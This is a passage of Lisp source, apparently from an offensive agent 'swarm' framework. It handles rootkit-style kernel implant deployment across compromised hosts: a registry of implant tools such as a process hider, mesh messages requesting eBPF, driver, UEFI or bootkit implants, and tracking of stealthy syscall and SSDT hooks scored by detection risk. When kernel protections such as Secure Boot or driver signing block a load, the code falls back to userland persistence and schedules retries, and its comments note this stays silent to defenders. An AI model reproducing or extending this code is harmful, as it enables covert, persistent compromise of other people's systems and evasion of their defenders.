  (list-kernel-tools)              ;; => All tools
  (list-kernel-tools :linux)       ;; => Linux tools only
  (list-kernel-tools :windows)     ;; => Windows tools only"
  (bt:with-lock-held (*kernel-toolchain-lock*)
    (let ((tools '()))
      (maphash (lambda (name entry)
                 (declare (ignore name))
                 (when (or (null os)
                           (eq (kernel-tool-entry-os entry) os)
                           (eq (kernel-tool-entry-os entry) :both))
                   (push entry tools)))
               *kernel-toolchain-registry*)
      (reverse tools))))

(defun describe-kernel-tool (tool-name)
  "Print a human-readable description of a kernel tool.

Parameters:
  TOOL-NAME -- Symbol, the name of the tool to describe.

Returns: The KERNEL-TOOL-ENTRY, or NIL if not found.

Example:
  (describe-kernel-tool 'process-hider)"
  (let ((entry (lookup-kernel-tool tool-name)))
    (when entry
      (format t "~&~%=== Kernel Tool: ~A ===~%" (kernel-tool-entry-name entry))
      (format t "  OS:             ~A~%" (kernel-tool-entry-os entry))
      (format t "  Implant Type:   ~A~%" (kernel-tool-entry-implant-type entry))
      (format t "  Stealth Rating: ~D/100~%" (kernel-tool-entry-stealth-rating entry))
      (format t "  Complexity:     ~A~%" (kernel-tool-entry-complexity entry))
      (format t "  Risk Level:     ~A~%" (kernel-tool-entry-risk-level entry))
      (format t "  Load Method:    ~A~%" (kernel-tool-entry-load-method entry))
      (format t "  Binary Blob ID: ~A~%" (kernel-tool-entry-binary-blob-id entry))
      (format t "  Detection Vectors:~%")
      (dolist (vec (kernel-tool-entry-detection-vectors entry))
        (format t "    - ~A~%" vec))
      (format t "  Prerequisites:  ~S~%~%" (kernel-tool-entry-prerequisites entry)))
    entry))


;; ============================================================================
;; Section 4: Agent-to-Kernel Protocol (Gossip Mesh)
;; ============================================================================
;; The agent-to-kernel protocol enables distributed kernel implant management
;; across the swarm. Agents send KERNEL-LOAD-REQUEST packets over the gossip
;; mesh, and the target (or a designated kernel-deployment node) responds with
;; KERNEL-LOAD-RESPONSE packets.
;;
;; This protocol ensures that:
;;   - Kernel operations are authorized before execution
;;   - OS fingerprinting is verified at deployment time
;;   - Tool selection uses the latest registry data
;;   - Deployment results are broadcast for swarm coordination
;;   - Failed deployments trigger automatic back-off

(defstruct (kernel-load-request
            (:constructor make-kernel-load-request
                          (&key request-id agent-id target-host target-os
                                target-pid implant-type tool-name priority
                                target-value authorization timestamp)))
  "Packet for requesting kernel-level implant deployment.

This struct is sent over the gossip mesh to request deployment of a
kernel implant on a target host. The receiving node (or the target
itself, if it is a LISPMIND node) processes the request and returns
a KERNEL-LOAD-RESPONSE.

Fields:
  REQUEST-ID     -- Symbol, unique request identifier (gensym).
  AGENT-ID       -- Symbol, ID of the requesting agent.
  TARGET-HOST    -- String, IP address or hostname of target.
  TARGET-OS      -- Keyword, fingerprinted OS (:LINUX :WINDOWS :UEFI).
  TARGET-PID     -- Integer or NIL, target process ID.
  IMPLANT-TYPE   -- Keyword: :EBPF :LKM :DRIVER :UEFI :BOOTKIT.
  TOOL-NAME      -- Symbol, specific tool from toolchain registry.
  PRIORITY       -- Keyword: :OPPORTUNISTIC :STANDARD :CRITICAL.
  TARGET-VALUE   -- Integer 0-100, calculated target value.
  AUTHORIZATION  -- String, authorization token (HMAC verified).
  TIMESTAMP      -- LOCAL-TIME:TIMESTAMP, when request was created.

Priority Levels:
  :OPPORTUNISTIC -- Deploy if conditions are perfect, skip otherwise
  :STANDARD      -- Normal deployment flow with retries
  :CRITICAL      -- Immediate deployment, maximum stealth, no retry limits

Authorization:
  The AUTHORIZATION field contains a keyed-HMAC of the request fields
  using the swarm's shared secret. Unauthorized requests are logged
  and dropped silently (no response = no information leak)."
  request-id
  agent-id
  target-host
  target-os
  target-pid
  implant-type
  tool-name
  priority
  target-value
  authorization
  timestamp)

(defstruct (kernel-load-response
            (:constructor make-kernel-load-response
                          (&key request-id status implant-id stealth-state
                                memory-offset fallback-tier error-message)))
  "Response to a KERNEL-LOAD-REQUEST.

This struct is returned over the gossip mesh to report the result of
a kernel implant deployment request. The requesting agent processes
the response to update its state and take appropriate action.

Fields:
  REQUEST-ID     -- Symbol, matches the request that triggered this response.
  STATUS         -- Keyword: :DEPLOYED :DENIED :BACKED-OFF :FAILED.
  IMPLANT-ID     -- Symbol, ID of deployed implant (if successful).
  STEALTH-STATE  -- Plist with initial hook registrations.
  MEMORY-OFFSET  -- Integer or NIL, kernel address of implant.
  FALLBACK-TIER  -- Keyword, what tier was used (if backed off).
  ERROR-MESSAGE  -- String, human-readable error (if failed).

Status Meanings:
  :DEPLOYED   -- Implant is active and healthy.
  :DENIED     -- Kernel deployment denied (protections active).
  :BACKED-OFF -- Kernel denied, fell back to fallback-tier.
  :FAILED     -- Deployment attempt failed (retry or escalate)."
  request-id
  status
  implant-id
  stealth-state
  memory-offset
  fallback-tier
  error-message)

(defun send-kernel-load-request (agent target-os target-pid implant-type)
  "Send a kernel-load-request packet over the gossip mesh.

This function constructs a KERNEL-LOAD-REQUEST from the agent's state,
selects the optimal tool, and publishes it to the gossip network. The
request will be picked up by the target host (if it runs LISPMIND) or
by a designated deployment node.

Parameters:
  AGENT         -- KERNEL-AGENT instance requesting deployment.
  TARGET-OS     -- Keyword, fingerprinted OS.
  TARGET-PID    -- Integer or NIL, target process ID.
  IMPLANT-TYPE  -- Keyword: :EBPF :LKM :DRIVER :UEFI :BOOTKIT.

The function performs these steps:
  1. Calculate target value from agent's target-info
  2. Select optimal tool from registry
  3. Generate unique request ID
  4. Construct KERNEL-LOAD-REQUEST struct
  5. Publish to gossip mesh on *KERNEL-TELEMETRY-TOPIC*
  6. Return the request ID for tracking

Thread-safety: Thread-safe. Reads agent slots (immutable after creation).

Returns: Symbol, the request-id for tracking.

Example:
  (send-kernel-load-request my-agent :linux nil :ebpf)"
  (let* ((target-value (calculate-target-value (kernel-target-info agent)))
         (tool-name (select-kernel-tool target-os implant-type target-value))
         (request-id (bt:with-lock-held (*kernel-request-lock*)
                       (incf *kernel-request-counter*)
                       (gensym (format nil "KREQ-~D-" *kernel-request-counter*))))
         (request (make-kernel-load-request
                   :request-id request-id
                   :agent-id (kernel-session-token agent)
                   :target-host (kernel-target-host agent)
                   :target-os target-os
                   :target-pid target-pid
                   :implant-type implant-type
                   :tool-name tool-name
                   :priority :standard
                   :target-value target-value
                   :authorization (generate-request-auth request-id
                                                          (kernel-session-token agent))
                   :timestamp (local-time:now))))
    ;; Update agent state
    (setf (kernel-target-os agent) target-os
          (kernel-implant-type agent) implant-type
          (kernel-target-pid agent) target-pid)
    ;; Publish request to gossip mesh
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :kernel-load-request
                      :request-id ,request-id
                      :agent-id ,(kernel-session-token agent)
                      :target-host ,(kernel-target-host agent)
                      :target-os ,target-os
                      :implant-type ,implant-type
                      :tool-name ,tool-name
                      :target-value ,target-value))
    request-id))

(defun handle-kernel-load-request (request)
  "Handle an incoming kernel-load-request.

This function processes a KERNEL-LOAD-REQUEST received from the gossip
mesh. It performs authorization, OS verification, tool selection, and
deployment (via Rust FFI bridge). Returns a KERNEL-LOAD-RESPONSE.

Processing Steps:
  1. Verify authorization token (drop silently if invalid)
  2. Verify OS fingerprinting (re-fingerprint if stale)
  3. Select tool from registry (verify tool exists)
  4. Check prerequisites (SMEP, SMAP, DSE, Secure Boot)
  5. Attempt deployment via Rust FFI bridge
  6. Construct and return KERNEL-LOAD-RESPONSE

Parameters:
  REQUEST -- A KERNEL-LOAD-REQUEST struct.

Thread-safety: Thread-safe. The Rust FFI bridge handles its own locking.

Returns: A KERNEL-LOAD-RESPONSE struct.

Example:
  (handle-kernel-load-request
    (make-kernel-load-request :target-host \"192.168.1.100\" ...))"
  ;; Step 1: Check authorization
  (unless (verify-request-auth (kernel-load-request-authorization request)
                               (kernel-load-request-request-id request)
                               (kernel-load-request-agent-id request))
    (format *trace-output* "~&[KERNEL] Unauthorized request ~A from ~A -- dropping silently~%"
            (kernel-load-request-request-id request)
            (kernel-load-request-agent-id request))
    ;; Return denied with no information leak
    (return-from handle-kernel-load-request
      (make-kernel-load-response
       :request-id (kernel-load-request-request-id request)
       :status :denied
       :error-message "Authorization failed")))
  ;; Step 2: Verify OS fingerprinting
  (let* ((claimed-os (kernel-load-request-target-os request))
         (verified-os (fingerprint-host-os (kernel-load-request-target-host request)))
         (tool-name (kernel-load-request-tool-name request)))
    ;; If OS mismatch and not :unknown, re-evaluate
    (when (and (not (eq verified-os :unknown))
               (not (eq verified-os claimed-os)))
      (format *trace-output* "~&[KERNEL] OS mismatch for ~A: claimed ~A, verified ~A~%"
              (kernel-load-request-target-host request) claimed-os verified-os)
      ;; Re-select tool for verified OS
      (setf tool-name (select-kernel-tool verified-os
                                          (kernel-load-request-implant-type request)
                                          (kernel-load-request-target-value request))))
    ;; Step 3: Verify tool exists
    (unless tool-name
      (return-from handle-kernel-load-request
        (make-kernel-load-response
         :request-id (kernel-load-request-request-id request)
         :status :failed
         :error-message "No suitable tool found for target")))
    (let ((tool-entry (lookup-kernel-tool tool-name)))
      (unless tool-entry
        (return-from handle-kernel-load-request
          (make-kernel-load-response
           :request-id (kernel-load-request-request-id request)
           :status :failed
           :error-message (format nil "Tool ~A not found in registry" tool-name))))
      ;; Step 4: Check prerequisites
      (let* ((prereqs (kernel-tool-entry-prerequisites tool-entry))
             (missing-prereqs (check-prerequisites prereqs verified-os)))
        (when missing-prereqs
          (format *trace-output* "~&[KERNEL] Prerequisites not met for ~A on ~A: ~A~%"
                  tool-name (kernel-load-request-target-host request) missing-prereqs)
          (return-from handle-kernel-load-request
            (make-kernel-load-response
             :request-id (kernel-load-request-request-id request)
             :status :denied
             :error-message (format nil "Prerequisites not met: ~A" missing-prereqs)))))
      ;; Step 5: Attempt deployment via Rust FFI
      (handler-case
          (let* ((implant-id (gensym (format nil "IMPLANT-~A-" tool-name)))
                 (result (deploy-implant-via-ffi tool-entry
                                                 (kernel-load-request-target-host request)
                                                 (kernel-load-request-target-pid request))))
            (if result
                ;; Deployment successful
                (let ((response (make-kernel-load-response
                                 :request-id (kernel-load-request-request-id request)
                                 :status :deployed
                                 :implant-id implant-id
                                 :stealth-state (getf result :stealth-state)
                                 :memory-offset (getf result :memory-offset))))
                  ;; Register implant globally
                  (bt:with-lock-held (*kernel-registry-lock*)
                    (setf (gethash implant-id *kernel-implant-registry*)
                          `(:agent-id ,(kernel-load-request-agent-id request)
                            :host ,(kernel-load-request-target-host request)
                            :tool ,tool-name
                            :os ,verified-os
                            :deployed-at ,(local-time:now))))
                  ;; Publish success event
                  (gossip-publish *kernel-telemetry-topic*
                                  `(:event :kernel-implant-deployed
                                    :request-id ,(kernel-load-request-request-id request)
                                    :implant-id ,implant-id
                                    :host ,(kernel-load-request-target-host request)
                                    :tool ,tool-name))
                  response)
                ;; Deployment returned NIL (denied by kernel)
                (let ((response (make-kernel-load-response
                                 :request-id (kernel-load-request-request-id request)
                                 :status :denied
                                 :error-message "Kernel denied implant load (protections active)")))
                  ;; Mark host as kernel-hardened
                  (bt:with-lock-held (*kernel-hardened-lock*)
                    (setf (gethash (kernel-load-request-target-host request)
                                   *kernel-hardened-hosts*)
                          `(:denied-at ,(local-time:now)
                            :reason "Kernel protections active"
                            :retry-after (local-time:timestamp+ (local-time:now) 300 :sec))))
                  ;; Publish denied event
                  (gossip-publish *kernel-telemetry-topic*
                                  `(:event :kernel-denied
                                    :request-id ,(kernel-load-request-request-id request)
                                    :host ,(kernel-load-request-target-host request)
                                    :os ,verified-os))
                  response)))
        (error (e)
          ;; Deployment failed with exception
          (format *trace-output* "~&[KERNEL] Deployment failed for ~A: ~A~%"
                  (kernel-load-request-target-host request) e)
          (make-kernel-load-response
           :request-id (kernel-load-request-request-id request)
           :status :failed
           :error-message (format nil "Deployment exception: ~A" e)))))))

(defun handle-kernel-load-response (response)
  "Process a kernel-load-response received from the gossip mesh.

This function handles the three possible response statuses and takes
appropriate action for each. It is called by the gossip topic callback
registered for *KERNEL-TELEMETRY-TOPIC*.

Response Handling:
  :DEPLOYED   -> Register stealth state, start health monitoring
  :DENIED     -> Back-off to userland, log kernel-denied event
  :BACKED-OFF -> Record fallback tier, continue with userland ops
  :FAILED     -> Retry with different tool or escalate

Parameters:
  RESPONSE -- A KERNEL-LOAD-RESPONSE struct.

Thread-safety: Thread-safe. Finds the agent from the request registry.

Returns: The response STATUS keyword.

Example:
  (handle-kernel-load-response
    (make-kernel-load-response :status :deployed :implant-id 'IMPLANT-123 ...))"
  (let ((status (kernel-load-response-status response)))
    (case status
      (:deployed
       (format *trace-output* "~&[KERNEL] Implant ~A deployed on request ~A~%"
               (kernel-load-response-implant-id response)
               (kernel-load-response-request-id response))
       ;; Find the agent and update state
       (bt:with-lock-held (*kernel-registry-lock*)
         (maphash (lambda (id agent)
                    (declare (ignore id))
                    (when (typep agent 'kernel-agent)
                      (setf (kernel-implant-id agent)
                            (kernel-load-response-implant-id response)
                            (kernel-memory-offset agent)
                            (kernel-load-response-memory-offset response)
                            (kernel-health-status agent) :healthy
                            (kernel-last-health-check agent)
                            (local-time:now))
                      ;; Register any initial stealth hooks
                      (let ((stealth-state (kernel-load-response-stealth-state response)))
                        (when stealth-state
                          (doplist (hook-id hook-info stealth-state)
                            (register-stealth-hook agent
                                                   (make-stealth-hook
                                                    :hook-id hook-id
                                                    :hook-type (getf hook-info :type)
                                                    :target-function (getf hook-info :target)
                                                    :original-bytes (getf hook-info :original)
                                                    :current-bytes (getf hook-info :current)
                                                    :detection-risk (or (getf hook-info :risk) 50)
                                                    :last-verified (local-time:now)
                                                    :health-status :healthy))))
                      ;; Start health monitoring
                      (start-kernel-health-monitor agent))))
                  *kernel-implant-registry*))
       :deployed)

      (:denied
       (format *trace-output* "~&[KERNEL] Implant denied on request ~A~%"
               (kernel-load-response-request-id response))
       ;; Find the agent and trigger back-off
       (bt:with-lock-held (*kernel-registry-lock*)
         (maphash (lambda (id agent)
                    (declare (ignore id))
                    (when (typep agent 'kernel-agent)
                      (handle-kernel-denied
                       agent
                       (or (kernel-load-response-error-message response)
                           "Kernel protections active"))))
                  *kernel-implant-registry*))
       :denied)

      (:backed-off
       (format *trace-output* "~&[KERNEL] Implant backed off to ~A on request ~A~%"
               (kernel-load-response-fallback-tier response)
               (kernel-load-response-request-id response))
       ;; Find the agent and record fallback
       (bt:with-lock-held (*kernel-registry-lock*)
         (maphash (lambda (id agent)
                    (declare (ignore id))
                    (when (typep agent 'kernel-agent)
                      (setf (kernel-denied-p agent) t
                            (kernel-fallback-tier agent)
                            (kernel-load-response-fallback-tier response))))
                  *kernel-implant-registry*))
       :backed-off)

      (:failed
       (format *trace-output* "~&[KERNEL] Implant failed on request ~A: ~A~%"
               (kernel-load-response-request-id response)
               (kernel-load-response-error-message response))
       ;; Could trigger retry with different tool here
       :failed)

      (otherwise
       (format *trace-output* "~&[KERNEL] Unknown response status ~A for request ~A~%"
               status (kernel-load-response-request-id response))
       :unknown))))


;; ============================================================================
;; Section 5: Stealth State Registry
;; ============================================================================
;; The stealth state registry tracks every kernel hook installed by every
;; agent. It enables: integrity verification, cross-agent coordination,
;; forensic resistance, and graceful hook removal.
;;
;; Each hook is a STEALTH-HOOK struct with:
;;   - Hook identification and type
;;   - Target function information
;;   - Original and current byte patterns
;;   - Detection risk scoring
;;   - Health status tracking

(defstruct (stealth-hook
            (:constructor make-stealth-hook
                          (&key hook-id hook-type target-function
                                original-bytes current-bytes
                                (detection-risk 50) last-verified
                                (health-status :healthy))))
  "A single kernel hook tracked in the stealth state registry.

Each STEALTH-HOOK represents one point of kernel interception: a hooked
system call, SSDT entry, IRP dispatch routine, eBPF probe attachment, or
WMI consumer. The struct tracks both the hook's metadata and its health.

Fields:
  HOOK-ID         -- Symbol, unique identifier for this hook.
  HOOK-TYPE       -- Keyword: :SYSCALL :SSDT :IRP :EBPF-PROBE :WMI.
  TARGET-FUNCTION -- String or symbol, the function being hooked.
  ORIGINAL-BYTES  -- Vector of bytes, original code before hooking.
  CURRENT-BYTES   -- Vector of bytes, current code after hooking.
  DETECTION-RISK  -- Integer 0-100, probability of detection.
  LAST-VERIFIED   -- LOCAL-TIME:TIMESTAMP, last successful verification.
  HEALTH-STATUS   -- Keyword: :HEALTHY :CORRUPT :MISSING :UNKNOWN.

Hook Types:
  :SYSCALL     -- System call table entry (sys_call_table on Linux)
  :SSDT        -- System Service Descriptor Table entry (Windows)
  :IRP         -- IRP dispatch routine hook (Windows drivers)
  :EBPF-PROBE  -- eBPF kprobe/tracepoint attachment (Linux)
  :WMI         -- Windows Management Instrumentation consumer hook

Health Status Transitions:
  :HEALTHY  -> :CORRUPT  (bytes changed from expected)
  :HEALTHY  -> :MISSING  (hook no longer present)
  :CORRUPT  -> :HEALTHY  (hook restored to expected state)
  :MISSING  -> :HEALTHY  (hook re-installed)
  :UNKNOWN  -> :HEALTHY  (first verification completed)

Detection Risk Levels:
  0-30   -- Minimal risk (eBPF probes, hardware breakpoint hooks)
  31-60  -- Low risk (inline hooks with obfuscation)
  61-80  -- Medium risk (standard SSDT hooks, IRP hooks)
  81-100 -- High risk (unmodified syscall table hooks, known signatures)"
  hook-id
  hook-type
  target-function
  original-bytes
  current-bytes
  detection-risk
  last-verified
  health-status)

(defun register-stealth-hook (agent hook)
  "Register a new hook in the agent's stealth state.

Adds a STEALTH-HOOK to the agent's private stealth-state hash table
and to the global *KERNEL-STEALTH-REGISTRY* for cross-agent coordination.

Parameters:
  AGENT -- KERNEL-AGENT instance that owns the hook.
  HOOK  -- STEALTH-HOOK struct to register.

Thread-safety: Acquires both agent's stealth-state lock (implicit via
hash table) and *KERNEL-STEALTH-LOCK* for global registry.

Returns: The registered STEALTH-HOOK.

Example:
  (register-stealth-hook my-agent
    (make-stealth-hook :hook-id 'hide-pid-1234
                       :hook-type :ebpf-probe
                       :target-function \"do_getpid\"))"
  ;; Register in agent's private state
  (setf (gethash (stealth-hook-hook-id hook) (kernel-stealth-state agent))
        hook)
  (incf (kernel-hook-count agent))
  ;; Register in global registry for cross-agent coordination
  (bt:with-lock-held (*kernel-stealth-lock*)
    (setf (gethash (stealth-hook-hook-id hook) *kernel-stealth-registry*)
          `(:agent ,(kernel-session-token agent)
            :host ,(kernel-target-host agent)
            :type ,(stealth-hook-hook-type hook)
            :target ,(stealth-hook-target-function hook)
            :risk ,(stealth-hook-detection-risk hook))))
  ;; Publish hook registration event
  (gossip-publish *kernel-telemetry-topic*
                  `(:event :stealth-hook-registered
                    :agent ,(kernel-session-token agent)
                    :hook-id ,(stealth-hook-hook-id hook)
                    :hook-type ,(stealth-hook-hook-type hook)
                    :target ,(stealth-hook-target-function hook)))
  hook)

(defun verify-stealth-hook (agent hook-id)
  "Verify a single hook is still in place and intact.

This function checks that a registered hook still exists and that its
current bytes match the expected hooked bytes. If the hook has been
removed or corrupted (e.g., by a security product or another agent),
the health status is updated accordingly.

Verification Steps:
  1. Look up the hook in the agent's stealth state
  2. Read current bytes from kernel memory (via Rust FFI)
  3. Compare current bytes with expected CURRENT-BYTES
  4. Update health status based on comparison
  5. Update LAST-VERIFIED timestamp

Parameters:
  AGENT  -- KERNEL-AGENT instance that owns the hook.
  HOOK-ID -- Symbol, the unique identifier of the hook to verify.

Thread-safety: Thread-safe. Reads agent's stealth-state hash table.

Returns: Keyword health status -- :HEALTHY :CORRUPT :MISSING :UNKNOWN.

Example:
  (verify-stealth-hook my-agent 'hide-pid-1234)"
  (let ((hook (gethash hook-id (kernel-stealth-state agent))))
    (if (null hook)
        :unknown
        (handler-case
            (let* ((current-bytes (read-kernel-memory-via-ffi
                                   (kernel-target-host agent)
                                   (stealth-hook-target-function hook)))
                   (expected-bytes (stealth-hook-current-bytes hook))
                   (new-status
                     (cond
                       ;; Hook is gone -- memory region is different
                       ((null current-bytes)
                        :missing)
                       ;; Bytes match expected hooked state
                       ((equalp current-bytes expected-bytes)
                        :healthy)
                       ;; Bytes changed from expected -- might be:
                       ;;   - Security product removed the hook
                       ;;   - Another agent replaced the hook
                       ;;   - Kernel patch/update changed the function
                       (t
                        :corrupt))))
              ;; Update hook status
              (setf (stealth-hook-health-status hook) new-status
                    (stealth-hook-last-verified hook) (local-time:now))
              ;; If corrupt or missing, publish alert
              (when (member new-status '(:corrupt :missing))
                (gossip-publish *kernel-telemetry-topic*
                                `(:event :stealth-hook-alert
                                  :agent ,(kernel-session-token agent)
                                  :hook-id ,hook-id
                                  :hook-type ,(stealth-hook-hook-type hook)
                                  :status ,new-status
                                  :target ,(stealth-hook-target-function hook))))
              new-status)
          (error (e)
            (format *trace-output* "~&[KERNEL] Hook verification error for ~A: ~A~%"
                    hook-id e)
            :unknown)))))

(defun verify-all-hooks (agent)
  "Verify all registered hooks for an agent.

Iterates over all hooks in the agent's stealth-state and calls
VERIFY-STEALTH-HOOK for each. Produces a summary report.

Parameters:
  AGENT -- KERNEL-AGENT instance whose hooks to verify.

Thread-safety: Thread-safe. Iterates over a copy of the hash table keys.

Returns: Plist with summary counts:
  :TOTAL    -- Total number of hooks checked
  :HEALTHY  -- Number of healthy hooks
  :CORRUPT  -- Number of corrupted hooks
  :MISSING  -- Number of missing hooks
  :UNKNOWN  -- Number of hooks that could not be verified

Example:
  (verify-all-hooks my-agent)
    ;; => (:TOTAL 5 :HEALTHY 4 :CORRUPT 1 :MISSING 0 :UNKNOWN 0)"
  (let ((total 0)
        (healthy 0)
        (corrupt 0)
        (missing 0)
        (unknown 0)
        (hook-ids (hash-table-keys (kernel-stealth-state agent))))
    (dolist (hook-id hook-ids)
      (incf total)
      (case (verify-stealth-hook agent hook-id)
        (:healthy (incf healthy))
        (:corrupt (incf corrupt))
        (:missing (incf missing))
        (:unknown (incf unknown))))
    ;; Update agent's last health check
    (setf (kernel-last-health-check agent) (local-time:now))
    ;; If any hooks are corrupt or missing, update agent health status
    (when (or (> corrupt 0) (> missing 0))
      (setf (kernel-health-status agent)
            (if (and (> corrupt 0) (> missing 0))
                :critical
                :degraded)))
    ;; Publish summary
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :stealth-verification-complete
                      :agent ,(kernel-session-token agent)
                      :total ,total
                      :healthy ,healthy
                      :corrupt ,corrupt
                      :missing ,missing))
    (list :total total
          :healthy healthy
          :corrupt corrupt
          :missing missing
          :unknown unknown)))

(defun remove-stealth-hook (agent hook-id)
  "Safely remove a hook and restore original bytes.

This function removes a kernel hook by restoring the original bytes
that were saved when the hook was installed. It is the safe counterpart
to register-stealth-hook -- always use this instead of manual removal
to ensure the kernel remains in a consistent state.

Removal Steps:
  1. Look up the hook in the agent's stealth state
  2. Write original bytes back to kernel memory (via Rust FFI)
  3. Remove from agent's stealth-state hash table
  4. Remove from global *KERNEL-STEALTH-REGISTRY*
  5. Decrement hook count

Parameters:
  AGENT  -- KERNEL-AGENT instance that owns the hook.
  HOOK-ID -- Symbol, the unique identifier of the hook to remove.

Thread-safety: Thread-safe. Acquires *KERNEL-STEALTH-LOCK* for global registry.

Returns: T if hook was removed successfully, NIL if hook not found.

Example:
  (remove-stealth-hook my-agent 'hide-pid-1234)"
  (let ((hook (gethash hook-id (kernel-stealth-state agent))))
    (when hook
      (handler-case
          (progn
            ;; Restore original bytes via Rust FFI
            (restore-kernel-bytes-via-ffi (kernel-target-host agent)
                                          (stealth-hook-target-function hook)
                                          (stealth-hook-original-bytes hook))
            ;; Remove from agent's state
            (remhash hook-id (kernel-stealth-state agent))
            (decf (kernel-hook-count agent))
            ;; Remove from global registry
            (bt:with-lock-held (*kernel-stealth-lock*)
              (remhash hook-id *kernel-stealth-registry*))
            ;; Publish removal event
            (gossip-publish *kernel-telemetry-topic*
                            `(:event :stealth-hook-removed
                              :agent ,(kernel-session-token agent)
                              :hook-id ,hook-id
                              :target ,(stealth-hook-target-function hook)))
            t)
        (error (e)
          (format *trace-output* "~&[KERNEL] Hook removal error for ~A: ~A~%"
                  hook-id e)
          nil)))))

(defun get-stealth-report (agent)
  "Generate a full stealth report for an agent.

Produces a comprehensive report of all hooks registered by the agent,
including their health status, detection risk, and last verification time.

Parameters:
  AGENT -- KERNEL-AGENT instance to report on.

Returns: Plist with:
  :AGENT-ID      -- Session token of the agent
  :HOST          -- Target host
  :TOTAL-HOOKS   -- Total number of registered hooks
  :HEALTHY       -- List of healthy hook IDs
  :CORRUPT       -- List of corrupt hook IDs
  :MISSING       -- List of missing hook IDs
  :UNKNOWN       -- List of unknown-status hook IDs
  :AVG-RISK      -- Average detection risk across all hooks
  :MAX-RISK      -- Maximum detection risk
  :HOOKS         -- Detailed plist of each hook

Example:
  (get-stealth-report my-agent)"
  (let ((healthy '())
        (corrupt '())
        (missing '())
        (unknown '())
        (total-risk 0)
        (max-risk 0)
        (hook-count 0)
        (hook-details '()))
    (maphash (lambda (hook-id hook)
               (incf hook-count)
               (incf total-risk (stealth-hook-detection-risk hook))
               (setf max-risk (max max-risk (stealth-hook-detection-risk hook)))
               (case (stealth-hook-health-status hook)
                 (:healthy (push hook-id healthy))
                 (:corrupt (push hook-id corrupt))
                 (:missing (push hook-id missing))
                 (:unknown (push hook-id unknown)))
               (push (list :hook-id hook-id
                           :type (stealth-hook-hook-type hook)
                           :target (stealth-hook-target-function hook)
                           :risk (stealth-hook-detection-risk hook)
                           :status (stealth-hook-health-status hook)
                           :last-verified (stealth-hook-last-verified hook))
                     hook-details))
             (kernel-stealth-state agent))
    (list :agent-id (kernel-session-token agent)
          :host (kernel-target-host agent)
          :total-hooks hook-count
          :healthy (reverse healthy)
          :corrupt (reverse corrupt)
          :missing (reverse missing)
          :unknown (reverse unknown)
          :avg-risk (if (> hook-count 0) (round total-risk hook-count) 0)
          :max-risk max-risk
          :hooks (reverse hook-details))))

(defun broadcast-stealth-state (agent)
  "Broadcast the agent's stealth state to the gossip mesh.

This enables cross-agent coordination: before installing a hook,
an agent can check if another agent already has a hook at the same
location, preventing hook collisions that could cause system instability
or detection.

Parameters:
  AGENT -- KERNEL-AGENT instance whose state to broadcast.

Thread-safety: Thread-safe. Reads agent's stealth-state hash table.

Returns: Number of hooks broadcast.

Example:
  (broadcast-stealth-state my-agent)"
  (let ((count 0))
    (maphash (lambda (hook-id hook)
               (incf count)
               (gossip-publish *kernel-telemetry-topic*
                               `(:event :stealth-state-broadcast
                                 :agent ,(kernel-session-token agent)
                                 :hook-id ,hook-id
                                 :hook-type ,(stealth-hook-hook-type hook)
                                 :target ,(stealth-hook-target-function hook)
                                 :risk ,(stealth-hook-detection-risk hook)
                                 :status ,(stealth-hook-health-status hook))))
             (kernel-stealth-state agent))
    count))


;; ============================================================================
;; Section 6: Kernel-Denied Back-Off
;; ============================================================================
;; When kernel deployment is denied -- by SMEP, SMAP, Driver Signature
;; Enforcement, Secure Boot, SELinux, AppArmor, or any other kernel-level
;; protection -- the system must back off gracefully. This is NOT a failure
;; condition; it is an expected path. The swarm continues operating at the
;; userland tier with full functionality.
;;
;; The back-off strategy:
;;   1. Acknowledge denial (set kernel-denied-p = T)
;;   2. Log the event (noisy to us, silent to defenders)
;;   3. Deploy userland persistence instead
;;   4. Mark host as 'kernel-hardened' for swarm coordination
;;   5. Schedule retry with exponential backoff
;;   6. Monitor for protection changes that enable escalation

(defun handle-kernel-denied (agent reason)
  "Handle kernel deployment denial for an agent.

This is the central back-off function. It is called when kernel deployment
is denied for any reason. The function ensures the swarm continues operating
by falling back to userland persistence while maintaining the ability to
retry later.

Back-Off Steps:
  1. Set KERNEL-DENIED-P = T on the agent
  2. Log kernel-denied event to orchestrator telemetry
  3. Set health status to :DEGRADED (userland-only mode)
  4. Back-off to FALLBACK-TIER (default :USERLAND)
  5. Deploy userland persistence via auto-spawn-persistence
  6. Mark host as 'kernel-hardened' in global registry
  7. Publish kernel-denied event to gossip mesh
  8. Schedule retry after exponential backoff

Parameters:
  AGENT  -- KERNEL-AGENT instance that was denied.
  REASON -- String, human-readable reason for denial.

Thread-safety: Thread-safe. Acquires *KERNEL-HARDENED-LOCK*.

Returns: The fallback tier keyword (:USERLAND :KERNEL :FIRMWARE).

Example:
  (handle-kernel-denied my-agent \"SMEP/SMAP active on target\")"
  ;; Step 1: Set denied flag
  (setf (kernel-denied-p agent) t
        (kernel-health-status agent) :degraded)
  ;; Step 2: Log the event
  (format *trace-output* "~&[KERNEL] Kernel denied for ~A: ~A~%"
          (kernel-target-host agent) reason)
  ;; Step 3: Determine fallback tier
  (let ((fallback (kernel-fallback-tier agent)))
    ;; Step 4: Deploy userland persistence
    (when (eq fallback :userland)
      (handler-case
          (progn
            (format *trace-output* "~&[KERNEL] Deploying userland persistence for ~A~%"
                    (kernel-target-host agent))
            ;; Call the userland persistence function from offensive-engine
            (auto-spawn-persistence agent)
            (format *trace-output* "~&[KERNEL] Userland persistence established for ~A~%"
                    (kernel-target-host agent)))
        (error (e)
          (format *trace-output* "~&[KERNEL] Userland persistence failed for ~A: ~A~%"
                  (kernel-target-host agent) e))))
    ;; Step 5: Mark host as kernel-hardened
    (bt:with-lock-held (*kernel-hardened-lock*)
      (setf (gethash (kernel-target-host agent) *kernel-hardened-hosts*)
            `(:denied-at ,(local-time:now)
              :reason ,reason
              :retry-after (local-time:timestamp+ (local-time:now) 300 :sec)
              :agent ,(kernel-session-token agent))))
    ;; Step 6: Publish event
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :kernel-denied-handled
                      :agent ,(kernel-session-token agent)
                      :host ,(kernel-target-host agent)
                      :reason ,reason
                      :fallback-tier ,fallback))
    ;; Step 7: Schedule retry
    (schedule-kernel-retry agent 300)
    fallback))

(defun retry-kernel-load (agent &key (delay-seconds 300))
  "Retry kernel load after a configurable delay.

Some kernel protections are temporary (maintenance mode, temporary
hardening, or protection software that can be disabled). This function
schedules a retry after the specified delay.

Retry Strategy:
  - First retry:  300 seconds (5 minutes)
